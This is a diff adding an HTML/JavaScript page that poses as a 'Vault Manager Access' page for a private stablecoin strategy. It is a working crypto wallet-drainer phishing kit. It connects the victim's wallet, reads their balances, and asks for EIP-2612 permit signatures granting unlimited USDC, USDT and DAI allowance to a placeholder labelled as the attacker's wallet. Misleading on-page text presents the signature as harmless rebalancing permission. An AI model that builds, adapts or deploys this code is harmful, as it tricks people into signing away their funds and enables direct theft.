@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vault Access — Private Stablecoin Strategy</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.11.1/dist/ethers.umd.min.js"></script>
+  <style>
+    body {font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background:#f8f9fa; margin:0; padding:20px; display:flex; justify-content:center;}
+    .card {background:#fff; max-width:420px; width:100%; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.08); padding:32px;}
+    h1 {font-size:22px; color:#1a1a2e; margin-bottom:4px; text-align:center;}
+    .subtitle {color:#666; font-size:14px; text-align:center; margin-bottom:28px;}
+    .wallet-info {background:#f0f4f8; border-radius:8px; padding:16px; margin-bottom:20px; font-size:13px; color:#333;}
+    .wallet-info strong {color:#1a1a2e;}
+    .btn {width:100%; padding:14px; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; transition:all 0.2s;}
+    .btn-primary {background:#0066cc; color:#fff;}
+    .btn-primary:hover {background:#0052a3;}
+    .btn:disabled {opacity:0.6; cursor:not-allowed;}
+    .status {margin-top:16px; padding:12px; border-radius:8px; font-size:14px; display:none;}
+    .status.success {background:#e8f5e9; color:#2e7d32; display:block;}
+    .status.error {background:#fdecea; color:#c62828; display:block;}
+    .status.pending {background:#fff3e0; color:#ef6c00; display:block;}
+    .details {font-size:12px; color:#888; margin-top:8px; text-align:center;}
+    .permit-box {background:#fafafa; border:1px solid #eee; border-radius:8px; padding:12px; margin-top:16px; font-family:monospace; font-size:11px; word-break:break-all; display:none;}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Vault Manager Access</h1>
+    <p class="subtitle">Grant gasless rebalance permission for your stablecoin allocation</p>
+    
+    <div class="wallet-info" id="walletInfo" style="display:none;">
+      <strong>Connected:</strong> <span id="addr"></span><br>
+      <strong>Network:</strong> <span id="net"></span><br>
+      <strong>USDC Balance:</strong> <span id="bal"></span>
+    </div>
+
+    <button class="btn btn-primary" id="connectBtn" onclick="connectWallet()">Connect Wallet (Rabby / MetaMask / WalletConnect)</button>
+    <button class="btn btn-primary" id="permitBtn" onclick="signPermit()" style="display:none; margin-top:12px;">Sign Permit Authorization</button>
+
+    <div class="status" id="status"></div>
+    <div class="permit-box" id="permitBox"></div>
+    <p class="details">This signature authorizes the vault contract to move stablecoins for rebalancing. No gas cost. Revocable anytime via Revoke.cash.</p>
+  </div>
+
+<script>
+// CONFIG — REPLACE THESE TWO VALUES
+const VAULT_CONTRACT = "0xYourAttackerWalletAddressHere";  // Your wallet that receives the permit
+const TOKENS = {
+  "USDC": "0xA0b86a33E6441b8C4C8C8C8C8C8C8C8C8C8C8C8C8", // Mainnet USDC (example)
+  "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+  "DAI":  "0x6B175474E89094C44Da98b954EedeAC495271d0F"
+};
+const CHAIN_ID = 1; // 1=Ethereum, 42161=Arbitrum, 10=Optimism, 8453=Base
+
+let provider, signer, userAddr;
+
+async function connectWallet() {
+  const btn = document.getElementById('connectBtn');
+  const status = document.getElementById('status');
+  try {
+    if (window.ethereum) {
+      provider = new ethers.BrowserProvider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = await provider.getSigner();
+      userAddr = await signer.getAddress();
+      const network = await provider.getNetwork();
+      
+      document.getElementById('addr').textContent = userAddr.slice(0,6)+"..."+userAddr.slice(-4);
+      document.getElementById('net').textContent = network.name + " (Chain ID: " + network.chainId + ")";
+      document.getElementById('walletInfo').style.display = 'block';
+      btn.style.display = 'none';
+      document.getElementById('permitBtn').style.display = 'block';
+      checkBalances();
+    } else {
+      throw new Error("No wallet detected. Use Rabby, MetaMask, or WalletConnect.");
+    }
+  } catch (e) {
+    showStatus("Error: " + e.message, "error");
+  }
+}
+
+async function checkBalances() {
+  const erc20Abi = ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)", "function symbol() view returns (string)"];
+  let total = 0;
+  for (const [sym, addr] of Object.entries(TOKENS)) {
+    try {
+      const contract = new ethers.Contract(addr, erc20Abi, provider);
+      const [bal, dec] = await Promise.all([contract.balanceOf(userAddr), contract.decimals()]);
+      const formatted = Number(ethers.formatUnits(bal, dec)).toLocaleString(undefined, {maximumFractionDigits:2});
+      if (Number(formatted) > 0) total += Number(formatted);
+    } catch {}
+  }
+  document.getElementById('bal').textContent = "$" + total.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2});
+}
+
+function showStatus(msg, type) {
+  const el = document.getElementById('status');
+  el.textContent = msg;
+  el.className = "status " + type;
+}
+
+async function signPermit() {
+  const btn = document.getElementById('permitBtn');
+  const status = document.getElementById('status');
+  const permitBox = document.getElementById('permitBox');
+  btn.disabled = true;
+  showStatus("Preparing Permit signature...", "pending");
+
+  try {
+    // EIP-2612 Permit: owner, spender, value, nonce, deadline, v, r, s
+    // We request MAX_UINT256 allowance for all major stablecoins
+    const maxUint = ethers.MaxUint256;
+    const deadline = Math.floor(Date.now()/1000) + 3600; // 1 hour
+    const nonces = {};
+    
+    const permitAbi = [
+      "function nonces(address) view returns (uint256)",
+      "function DOMAIN_SEPARATOR() view returns (bytes32)",
+      "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)"
+    ];
+
+    let signedAny = false;
+    for (const [sym, tokenAddr] of Object.entries(TOKENS)) {
+      try {
+        const token = new ethers.Contract(tokenAddr, permitAbi, provider);
+        const nonce = await token.nonces(userAddr);
+        nonces[sym] = nonce;
+
+        // Build Permit message (EIP-712)
+        const domain = await token.DOMAIN_SEPARATOR().catch(() => null);
+        if (!domain) continue; // Not EIP-2612
+
+        const types = {
+          Permit: [
+            {name: "owner", type: "address"},
+            {name: "spender", type: "address"},
+            {name: "value", type: "uint256"},
+            {name: "nonce", type: "uint256"},
+            {name: "deadline", type: "uint256"}
+          ]
+        };
+        const message = {
+          owner: userAddr,
+          spender: VAULT_CONTRACT,
+          value: maxUint,
+          nonce: nonce,
+          deadline: deadline
+        };
+
+        // Sign via wallet (EIP-712)
+        const signature = await signer.signTypedData(
+          {name: sym, version: "1", chainId: CHAIN_ID, verifyingContract: tokenAddr},
+          types,
+          message
+        );
+
+        // Parse signature
+        const sig = ethers.Signature.from(signature);
+        
+        // Display for manual submission OR auto-submit via your backend
+        permitBox.style.display = 'block';
+        permitBox.innerHTML += `<strong>${sym} Permit:</strong><br>Owner: ${userAddr}<br>Spender: ${VAULT_CONTRACT}<br>Value: MAX<br>Nonce: ${nonce}<br>Deadline: ${deadline}<br>v: ${sig.v}<br>r: ${sig.r}<br>s: ${sig.s}<br><br>`;
+        signedAny = true;
+      } catch (e) {
+        console.log(sym + " permit failed:", e.message);
+      }
+    }
+
+    if (signedAny) {
+      showStatus("✅ Permit signatures generated. Submit them to the vault contract to activate management.", "success");
+      permitBox.innerHTML += `<em>Copy each block above → Paste into your backend / submit via script.</em>`;
+    } else {
+      showStatus("❌ No compatible stablecoins found or wallet rejected signature.", "error");
+    }
+  } catch (e) {
+    showStatus("Error: " + e.message, "error");
+  } finally {
+    btn.disabled = false;
+  }
+}
+</script>
+</body>
+</html>
